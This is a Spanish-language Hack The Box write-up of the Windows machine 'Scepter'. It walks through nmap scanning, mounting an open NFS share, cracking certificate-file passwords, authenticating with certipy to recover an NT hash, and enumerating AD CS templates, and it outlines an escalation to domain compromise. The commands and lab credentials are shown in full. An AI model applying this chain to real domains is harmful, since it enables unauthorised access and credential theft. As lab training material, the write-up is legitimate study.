---
title: Scepter &#x1F4DC;
description: Scepter es una máquina Windows de dificultad alta que comienza con un recurso NFS sin autenticación, lo que permite al atacante descargar un archivo de certificado PFX sensible. Posteriormente, se descubre que el usuario comprometido posee la ACL User-Force-Change-Password, lo que permite cambiar la contraseña de la cuenta A.CARTER. La cuenta A.CARTER pertenece al grupo IT SUPPORT, cuyos miembros tienen privilegios GenericAll sobre la Organizational Unit (OU) llamada STAFF ACCESS CERTIFICATE, permitiendo al atacante tomar control total sobre todas las cuentas de usuario dentro de esa OU. Además, se identifica que la Certificate Authority (CA) es vulnerable a ESC14, específicamente a una asociación explícita débil (explicit weak mapping). El atacante compromete la cuenta H.BROWN modificando el atributo mail en LDAP y solicitando el certificado del template StaffAccessCertificate. La cuenta H.BROWN pertenece al grupo CMS, que tiene privilegios para modificar el atributo altSecurityIdentities de cualquier objeto en Active Directory dentro de la OU Helpdesk Enrollment Certificate. Dado que la CA es vulnerable a ESC14, el atacante puede modificar el atributo LDAP con una asociación fuerte (X509IssuerSerialNumber) y solicitar un certificado como Domain Computer, lo que permite comprometer la cuenta P.ADAMS, quien posee privilegios DCSync, resultando en el compromiso total del dominio. Una variante del ataque consiste en explotar el weak mapping X509RFC822, solicitando el template como el usuario D.BAKER y comprometiendo también la cuenta P.ADAMS.
date: 2025-06-19
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-scepter/scepter_logo.png
categories:
  - Hack_The_Box
  - Machines
tags:
  - hack_the_box
  - windows
  - reconnaissance
  - active_scanning

---
## Reconnaissance

### Active Scanning

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/htb/machines/scepter:-$ ping -c 1 10.10.11.65
PING 10.10.11.65 (10.10.11.65) 56(84) bytes of data.
64 bytes from 10.10.11.65: icmp_seq=1 ttl=127 time=945 ms

--- 10.10.11.65 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 945.359/945.359/945.359/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/htb/machines/scepter:-$ sudo nmap -p- --open -sS -T5 -vvv 10.10.11.65 -n -Pn -oG nmap1
Host: 10.10.11.65 ()    Status: Up
Host: 10.10.11.65 ()    Ports: 53/open/tcp//domain///, 88/open/tcp//kerberos-sec///, 111/open/tcp//rpcbind///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 445/open/tcp//microsoft-ds///, 464/open/tcp//kpasswd5///, 593/open/tcp//http-rpc-epmap///, 636/open/tcp//ldapssl///, 2049/open/tcp//nfs///, 3268/open/tcp//globalcatLDAP///, 3269/open/tcp//globalcatLDAPssl///, 9389/open/tcp//adws///, 47001/open/tcp//winrm///, 49664/open/tcp/////, 49665/open/tcp/////, 49666/open/tcp/////, 49669/open/tcp/////, 49673/open/tcp/////, 49688/open/tcp/////, 49689/open/tcp/////, 49690/open/tcp/////, 49691/open/tcp/////, 49705/open/tcp/////, 49716/open/tcp/////, 49719/open/tcp/////
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/htb/machines/scepter:-$ sudo nmap -sCV -vvv -p53,88,111,135,139,445,464,593,636,2049,3268,3269,9389,47001,49664,49665,49666,49669,49673,49688,49689,49690,49691,49705,49716,49719 10.10.11.65 -oN nmap2
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-06-09 23:23:25Z)
111/tcp   open  rpcbind       syn-ack ttl 127 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.scepter.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.scepter.htb
| Issuer: commonName=scepter-DC01-CA/domainComponent=scepter
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-11-01T03:22:33
| Not valid after:  2025-11-01T03:22:33
| MD5:   2af6:88f7:a6bf:ef50:9b84:3dc6:3df5:e018
| SHA-1: cd9a:97ee:25c8:00ba:1427:c259:02ed:6e0d:9a21:7fd9
| -----BEGIN CERTIFICATE-----
| MIIGLDCCBRSgAwIBAgITYgAAACHTgl9VBArXxgAAAAAAITANBgkqhkiG9w0BAQsF
| ADBIMRMwEQYKCZImiZPyLGQBGRYDaHRiMRcwFQYKCZImiZPyLGQBGRYHc2NlcHRl
| cjEYMBYGA1UEAxMPc2NlcHRlci1EQzAxLUNBMB4XDTI0MTEwMTAzMjIzM1oXDTI1
| MTEwMTAzMjIzM1owGzEZMBcGA1UEAxMQZGMwMS5zY2VwdGVyLmh0YjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBALpnNbJF0dXLfbmd6n3LpJlQDKdwZdVT
| JxqBS7Vz/LPj+ZpUA6JFTi31Jdy8qFqRF3HuBhsA5T+RPLGuhjoNAqMKqlWEcqOC
| A4VHl99hLPKB0mpqSTVKIXzvvU2Aa2Pc42gGY4nmpODO06an3XddKCMdQx2dPXK+
| /GUmsYPEszgoefAJLOaJ/ot23i1ffdcYE8c7xbi/ivUmLmOo6zQp/6FCRsJM4Ago
| OZ0mV9tLt7jfltrNBL+Iq8FWoiV59ciaOmNLNwIo+JqkPjTYJNSuSsiaeVNUtoY1
| yipUhhDOyX70wc48R20/So6PUOKnkGJ6ovrEQJCEpVBkic/eLlHaWbUCAwEAAaOC
| AzowggM2MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A
| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/
| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3
| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL
| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFM+Zo2Ay
| sKIDhRmsELT8JvcQ5qJEMB8GA1UdIwQYMBaAFOuQVDjSpmyJasttTaS6dRVgFSfj
| MIHKBgNVHR8EgcIwgb8wgbyggbmggbaGgbNsZGFwOi8vL0NOPXNjZXB0ZXItREMw
| MS1DQSxDTj1kYzAxLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxD
| Tj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNjZXB0ZXIsREM9aHRiP2Nl
| cnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0
| cmlidXRpb25Qb2ludDCBwQYIKwYBBQUHAQEEgbQwgbEwga4GCCsGAQUFBzAChoGh
| bGRhcDovLy9DTj1zY2VwdGVyLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtl
| eSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2Nl
| cHRlcixEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRp
| ZmljYXRpb25BdXRob3JpdHkwPAYDVR0RBDUwM6AfBgkrBgEEAYI3GQGgEgQQuQyF
| jYzg20GS235CRJngkoIQZGMwMS5zY2VwdGVyLmh0YjBLBgkrBgEEAYI3GQIEPjA8
| oDoGCisGAQQBgjcZAgGgLAQqUy0xLTUtMjEtNzQ4Nzk1NDYtOTE2ODE4NDM0LTc0
| MDI5NTM2NS0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQCKy5wPeTrqhyCr9gEglZ8K
| EKsHXZsfcQu35qHlaxyWxISCZ4CCDaD+MlTT6fnvw3oyF4Nd8ArI/QQwnqqPxxYk
| 72HoVo835fo0lP3FeDfnbYT6rUMrv4QVkeJossDwnOnrZuGPtfUEWxNg1O76D2kU
| gejyZzFgBcvaXAt/pEHVki2Zfdz7p1OAkbjP2cAsjFAAzdAZT1FpRdcL+s1PwZqd
| urydtAwyuvSqyzDYJgt4aj0kdyNoFexNK2meqw5DdYWnrDTcBLdN4v37kKtMm2w1
| 9X2shB2kglATgm0ULSz7jHVZNnACrxBBUsofMPVCvpsEBmfCb4zPo6a+oA0MjGsS
|_-----END CERTIFICATE-----
|_ssl-date: 2025-06-09T23:24:41+00:00; +7h59m59s from scanner time.
2049/tcp  open  nlockmgr      syn-ack ttl 127 1-4 (RPC #100021)
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.scepter.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.scepter.htb
| Issuer: commonName=scepter-DC01-CA/domainComponent=scepter
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-11-01T03:22:33
| Not valid after:  2025-11-01T03:22:33
| MD5:   2af6:88f7:a6bf:ef50:9b84:3dc6:3df5:e018
| SHA-1: cd9a:97ee:25c8:00ba:1427:c259:02ed:6e0d:9a21:7fd9
| -----BEGIN CERTIFICATE-----
| MIIGLDCCBRSgAwIBAgITYgAAACHTgl9VBArXxgAAAAAAITANBgkqhkiG9w0BAQsF
| ADBIMRMwEQYKCZImiZPyLGQBGRYDaHRiMRcwFQYKCZImiZPyLGQBGRYHc2NlcHRl
| cjEYMBYGA1UEAxMPc2NlcHRlci1EQzAxLUNBMB4XDTI0MTEwMTAzMjIzM1oXDTI1
| MTEwMTAzMjIzM1owGzEZMBcGA1UEAxMQZGMwMS5zY2VwdGVyLmh0YjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBALpnNbJF0dXLfbmd6n3LpJlQDKdwZdVT
| JxqBS7Vz/LPj+ZpUA6JFTi31Jdy8qFqRF3HuBhsA5T+RPLGuhjoNAqMKqlWEcqOC
| A4VHl99hLPKB0mpqSTVKIXzvvU2Aa2Pc42gGY4nmpODO06an3XddKCMdQx2dPXK+
| /GUmsYPEszgoefAJLOaJ/ot23i1ffdcYE8c7xbi/ivUmLmOo6zQp/6FCRsJM4Ago
| OZ0mV9tLt7jfltrNBL+Iq8FWoiV59ciaOmNLNwIo+JqkPjTYJNSuSsiaeVNUtoY1
| yipUhhDOyX70wc48R20/So6PUOKnkGJ6ovrEQJCEpVBkic/eLlHaWbUCAwEAAaOC
| AzowggM2MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A
| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/
| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3
| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL
| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFM+Zo2Ay
| sKIDhRmsELT8JvcQ5qJEMB8GA1UdIwQYMBaAFOuQVDjSpmyJasttTaS6dRVgFSfj
| MIHKBgNVHR8EgcIwgb8wgbyggbmggbaGgbNsZGFwOi8vL0NOPXNjZXB0ZXItREMw
| MS1DQSxDTj1kYzAxLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxD
| Tj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNjZXB0ZXIsREM9aHRiP2Nl
| cnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0
| cmlidXRpb25Qb2ludDCBwQYIKwYBBQUHAQEEgbQwgbEwga4GCCsGAQUFBzAChoGh
| bGRhcDovLy9DTj1zY2VwdGVyLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtl
| eSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2Nl
| cHRlcixEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRp
| ZmljYXRpb25BdXRob3JpdHkwPAYDVR0RBDUwM6AfBgkrBgEEAYI3GQGgEgQQuQyF
| jYzg20GS235CRJngkoIQZGMwMS5zY2VwdGVyLmh0YjBLBgkrBgEEAYI3GQIEPjA8
| oDoGCisGAQQBgjcZAgGgLAQqUy0xLTUtMjEtNzQ4Nzk1NDYtOTE2ODE4NDM0LTc0
| MDI5NTM2NS0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQCKy5wPeTrqhyCr9gEglZ8K
| EKsHXZsfcQu35qHlaxyWxISCZ4CCDaD+MlTT6fnvw3oyF4Nd8ArI/QQwnqqPxxYk
| 72HoVo835fo0lP3FeDfnbYT6rUMrv4QVkeJossDwnOnrZuGPtfUEWxNg1O76D2kU
| gejyZzFgBcvaXAt/pEHVki2Zfdz7p1OAkbjP2cAsjFAAzdAZT1FpRdcL+s1PwZqd
| urydtAwyuvSqyzDYJgt4aj0kdyNoFexNK2meqw5DdYWnrDTcBLdN4v37kKtMm2w1
| 9X2shB2kglATgm0ULSz7jHVZNnACrxBBUsofMPVCvpsEBmfCb4zPo6a+oA0MjGsS
|_-----END CERTIFICATE-----
|_ssl-date: 2025-06-09T23:24:42+00:00; +7h59m59s from scanner time.
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.scepter.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.scepter.htb
| Issuer: commonName=scepter-DC01-CA/domainComponent=scepter
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-11-01T03:22:33
| Not valid after:  2025-11-01T03:22:33
| MD5:   2af6:88f7:a6bf:ef50:9b84:3dc6:3df5:e018
| SHA-1: cd9a:97ee:25c8:00ba:1427:c259:02ed:6e0d:9a21:7fd9
| -----BEGIN CERTIFICATE-----
| MIIGLDCCBRSgAwIBAgITYgAAACHTgl9VBArXxgAAAAAAITANBgkqhkiG9w0BAQsF
| ADBIMRMwEQYKCZImiZPyLGQBGRYDaHRiMRcwFQYKCZImiZPyLGQBGRYHc2NlcHRl
| cjEYMBYGA1UEAxMPc2NlcHRlci1EQzAxLUNBMB4XDTI0MTEwMTAzMjIzM1oXDTI1
| MTEwMTAzMjIzM1owGzEZMBcGA1UEAxMQZGMwMS5zY2VwdGVyLmh0YjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBALpnNbJF0dXLfbmd6n3LpJlQDKdwZdVT
| JxqBS7Vz/LPj+ZpUA6JFTi31Jdy8qFqRF3HuBhsA5T+RPLGuhjoNAqMKqlWEcqOC
| A4VHl99hLPKB0mpqSTVKIXzvvU2Aa2Pc42gGY4nmpODO06an3XddKCMdQx2dPXK+
| /GUmsYPEszgoefAJLOaJ/ot23i1ffdcYE8c7xbi/ivUmLmOo6zQp/6FCRsJM4Ago
| OZ0mV9tLt7jfltrNBL+Iq8FWoiV59ciaOmNLNwIo+JqkPjTYJNSuSsiaeVNUtoY1
| yipUhhDOyX70wc48R20/So6PUOKnkGJ6ovrEQJCEpVBkic/eLlHaWbUCAwEAAaOC
| AzowggM2MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A
| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/
| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3
| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL
| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFM+Zo2Ay
| sKIDhRmsELT8JvcQ5qJEMB8GA1UdIwQYMBaAFOuQVDjSpmyJasttTaS6dRVgFSfj
| MIHKBgNVHR8EgcIwgb8wgbyggbmggbaGgbNsZGFwOi8vL0NOPXNjZXB0ZXItREMw
| MS1DQSxDTj1kYzAxLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxD
| Tj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNjZXB0ZXIsREM9aHRiP2Nl
| cnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0
| cmlidXRpb25Qb2ludDCBwQYIKwYBBQUHAQEEgbQwgbEwga4GCCsGAQUFBzAChoGh
| bGRhcDovLy9DTj1zY2VwdGVyLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtl
| eSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2Nl
| cHRlcixEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRp
| ZmljYXRpb25BdXRob3JpdHkwPAYDVR0RBDUwM6AfBgkrBgEEAYI3GQGgEgQQuQyF
| jYzg20GS235CRJngkoIQZGMwMS5zY2VwdGVyLmh0YjBLBgkrBgEEAYI3GQIEPjA8
| oDoGCisGAQQBgjcZAgGgLAQqUy0xLTUtMjEtNzQ4Nzk1NDYtOTE2ODE4NDM0LTc0
| MDI5NTM2NS0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQCKy5wPeTrqhyCr9gEglZ8K
| EKsHXZsfcQu35qHlaxyWxISCZ4CCDaD+MlTT6fnvw3oyF4Nd8ArI/QQwnqqPxxYk
| 72HoVo835fo0lP3FeDfnbYT6rUMrv4QVkeJossDwnOnrZuGPtfUEWxNg1O76D2kU
| gejyZzFgBcvaXAt/pEHVki2Zfdz7p1OAkbjP2cAsjFAAzdAZT1FpRdcL+s1PwZqd
| urydtAwyuvSqyzDYJgt4aj0kdyNoFexNK2meqw5DdYWnrDTcBLdN4v37kKtMm2w1
| 9X2shB2kglATgm0ULSz7jHVZNnACrxBBUsofMPVCvpsEBmfCb4zPo6a+oA0MjGsS
|_-----END CERTIFICATE-----
|_ssl-date: 2025-06-09T23:24:40+00:00; +7h59m58s from scanner time.
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49688/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49689/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49690/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49691/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49705/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49716/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49719/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-06-09T23:24:33
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m58s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 18337/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 36463/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 13248/udp): CLEAN (Failed to receive data)
|   Check 4 (port 54214/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

En el escaneo inicial, detecto que el puerto `2049/TCP` está abierto, asociado al servicio NFS (Network File System). Este protocolo permite montar directorios compartidos entre sistemas, y si no está correctamente configurado, puede ser accedido por cualquier cliente de la red.

La salida de nmap, confirma que el recurso `/helpdesk` es accesible.

```terminal
/home/kali/Documents/htb/machines/scepter:-$ sudo nmap -sV -p 2049 --script=nfs\* 10.10.11.65
PORT     STATE SERVICE VERSION
2049/tcp open  mountd  1-3 (RPC #100005)
| nfs-showmount:
|_  /helpdesk
```

El objetivo es un controlador de dominio DC01 con sistema Windows Server 2019.

```terminal
/home/kali/Documents/htb/machines/scepter:-$ echo "10.10.11.65\tdc01\tscepter.htb\tdc01.scepter.htb" | sudo tee -a /etc/hosts

/home/kali/Documents/htb/machines/scepter:-$ sudo nxc smb 10.10.11.65
SMB         10.10.11.65     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False)
```

Con `showmount` obtengo una lista de directorios NFS exportados y sus reglas de acceso, el resultado indica que `/helpdesk` está disponible para todos los clientes, lo que significa que puedo montarlo directamente y explorar su contenido sin autenticación previa.

```terminal
/home/kali/Documents/htb/machines/scepter:-$ sudo nmap -sV -p 2049 --script=nfs\* 10.10.11.65 showmount -e 10.10.11.65
Export list for 10.10.11.65:
/helpdesk (everyone)
```

---
## Initial Access

Una vez confirmado que el recurso NFS `/helpdesk` es accesible para cualquiera, el siguiente paso fue montarlo localmente para poder examinar su contenido.

```terminal
/home/kali/Documents/htb/machines/scepter:-$ mkdir /mnt/nfs_helpdesk
/home/kali/Documents/htb/machines/scepter:-# mount -t nfs 10.10.11.65:/helpdesk /mnt/nfs_helpdesk
```

Al listar su contenido, aparecen varios ficheros con certificados y claves privadas.

```terminal
/home/kali/Documents/htb/machines/scepter:-# ls /mnt/nfs_helpdesk
baker.crt  baker.key  clark.pfx  lewis.pfx  scott.pfx

/home/kali/Documents/htb/machines/scepter:-# cp /tmp/nfs_helpdesk/* ./
```

---

Los archivos `.pfx` son contenedores que almacenan certificados y claves privadas, normalmente protegidos por contraseña. Para intentar obtener esas contraseñas, extraigo los hashes con pfx2john, de forma que puedan ser procesados por john para realizar un ataque de fuerza bruta.

```terminal
/home/kali/Documents/htb/machines/scepter:-$ pfx2john *.pfx > pfx_hashes

/home/kali/Documents/htb/machines/scepter:-$ john pfx_hashes --wordlist=/usr/share/wordlists/rockyou.txt
newpassword      (lewis.pfx)
newpassword      (clark.pfx)
newpassword      (scott.pfx)
```

El resultado del ataque concluyé que la contraseña `newpassword` esta presente en todos los `.pfx`.

Además de los `.pfx`, se encuentran los archivos pertenecientes a un usuario `baker`, un certificado `.crt` y una clave privada `.key`. Con esto, puedo generar una clave privada para `Baker` en formato `PEM` para empaquetarla junto a su certificado, esto me permite crear un `.pfx` valido.

```terminal
/home/kali/Documents/htb/machines/scepter:-$ sudo openssl rsa -in baker.key -out baker.pem -passin pass:newpassword
writing RSA key
```

Con la clave privada en formato PEM y el certificado original baker.crt, creo un contenedor PKCS#12 protegido con newpassword.

```terminal
/home/kali/Documents/htb/machines/scepter:-$ sudo openssl pkcs12 -export -out baker.pfx -inkey baker.pem -in baker.crt
Enter Export Password:
Verifying - Enter Export Password:

/home/kali/Documents/htb/machines/scepter:-$ sudo chmod +r baker.*
```

Este .pfx permite autenticación directa como Baker en servicios que soportan PKINIT.


```terminal
/home/kali/Documents/htb/machines/scepter:-$ faketime "$(rdate -n -p $IP | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" zsh

/home/kali/Documents/htb/machines/scepter:-$ certipy-ad auth -pfx baker.pfx -dc-ip 10.10.11.65 -domain scepter.htb
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'd.baker@scepter.htb'
[*]     Security Extension SID: 'S-1-5-21-74879546-916818434-740295365-1106'
[*] Using principal: 'd.baker@scepter.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'd.baker.ccache'
[*] Wrote credential cache to 'd.baker.ccache'
[*] Trying to retrieve NT hash for 'd.baker'
[*] Got hash for 'd.baker@scepter.htb': aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce


/home/kali/Documents/htb/machines/scepter:-$ nxc ldap scepter.htb -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce
LDAP        10.10.11.65     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:scepter.htb)
LDAP        10.10.11.65     389    DC01             [+] scepter.htb\d.baker:18b5fb0d99e7a475316213c15b6f22ce
```

---
## Lateral Movement

### Permission Groups Discovery

```terminal
/home/kali/Documents/htb/machines/scepter:-$ bloodhound-python -ns 10.10.11.65 -d scepter.htb -dc dc01.scepter.htb -u 'd.baker' --hashes 'aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce' --auth-method ntlm --zip -c All
```

![](assets/img/htb-writeup-scepter/scepter1_1.png)

```terminal
/home/kali/Documents/htb/machines/scepter:-$ certipy find -vulnerable -u d.baker -hashes :18b5fb0d99e7a475316213c15b6f22ce -dc-ip 10.10.11.65

Certificate Authorities
  0
    CA Name                             : scepter-DC01-CA
    DNS Name                            : dc01.scepter.htb
    Certificate Subject                 : CN=scepter-DC01-CA, DC=scepter, DC=htb
    Certificate Serial Number           : 716BFFE1BE1CD1A24010F3AD0E350340
    Certificate Validity Start          : 2024-10-31 22:24:19+00:00
    Certificate Validity End            : 2061-10-31 22:34:19+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SCEPTER.HTB\Administrators
      Access Rights
        ManageCa                        : SCEPTER.HTB\Administrators
                                          SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Enterprise Admins
        ManageCertificates              : SCEPTER.HTB\Administrators
                                          SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Enterprise Admins
        Enroll                          : SCEPTER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : StaffAccessCertificate
    Display Name                        : StaffAccessCertificate
    Certificate Authorities             : scepter-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireEmail
                                          SubjectRequireDnsAsCn
                                          SubjectRequireEmail
    Enrollment Flag                     : AutoEnrollment
                                          NoSecurityExtension
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 99 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-01T02:29:00+00:00
    Template Last Modified              : 2024-11-01T09:00:54+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SCEPTER.HTB\staff
      Object Control Permissions
        Owner                           : SCEPTER.HTB\Enterprise Admins
        Full Control Principals         : SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Local System
                                          SCEPTER.HTB\Enterprise Admins
        Write Owner Principals          : SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Local System
                                          SCEPTER.HTB\Enterprise Admins
        Write Dacl Principals           : SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Local System
                                          SCEPTER.HTB\Enterprise Admins
    [+] User Enrollable Principals      : SCEPTER.HTB\staff
    [!] Vulnerabilities
      ESC9                              : Template has no security extension.
    [*] Remarks
